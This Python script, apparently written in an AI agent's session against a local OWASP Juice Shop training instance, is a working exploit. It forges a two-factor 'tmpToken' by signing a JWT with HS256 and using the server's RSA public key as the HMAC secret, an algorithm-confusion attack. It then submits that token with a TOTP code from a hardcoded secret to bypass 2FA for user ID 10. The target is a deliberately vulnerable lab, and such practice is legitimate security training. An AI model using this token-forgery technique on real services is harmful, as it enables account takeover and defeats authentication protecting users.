import requests
import hmac
import hashlib
import base64
import json
import time
import pyotp

BASE_URL = "http://localhost:3000"
TOTP_SECRET = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"
PUBLIC_KEY_PATH = "/home/computeruse/juice-shop/encryptionkeys/jwt.pub"

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).decode('utf-8')
    return encoded.replace('=', '')

def forge_tmp_token():
    # 1. Load Public Key
    with open(PUBLIC_KEY_PATH, 'r') as f:
        pub_key = f.read()
    
    # 2. Header
    header = {"alg": "HS256", "typ": "JWT"}
    header_enc = base64url_encode(json.dumps(header))
    
    # 3. Payload
    # From routes/2fa.js: expects userId and type
    payload = {
        "userId": 10, # wurstbrot ID
        "type": "password_valid_needs_second_factor_token",
        "iat": int(time.time()),
        "exp": int(time.time()) + 300 # 5 minutes
    }
    payload_enc = base64url_encode(json.dumps(payload))
    
    # 4. Signature
    msg = f"{header_enc}.{payload_enc}".encode('utf-8')
    # Treat public key string as the HMAC secret
    secret = pub_key.encode('utf-8')
    
    signature = hmac.new(secret, msg, hashlib.sha256).digest()
    sig_enc = base64url_encode(signature)
    
    token = f"{header_enc}.{payload_enc}.{sig_enc}"
    return token

def solve_2fa(token):
    print(f"[*] Generated tmpToken: {token[:20]}...")
    
    totp = pyotp.TOTP(TOTP_SECRET)
    code = totp.now()
    print(f"[*] TOTP Code: {code}")
    
    payload = {
        "tmpToken": token,
        "totpToken": code
    }
    
    try:
        resp = requests.post(
            f"{BASE_URL}/rest/2fa/verify",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        print(f"[*] Status: {resp.status_code}")
        print(f"[*] Response: {resp.text}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    token = forge_tmp_token()
    solve_2fa(token)
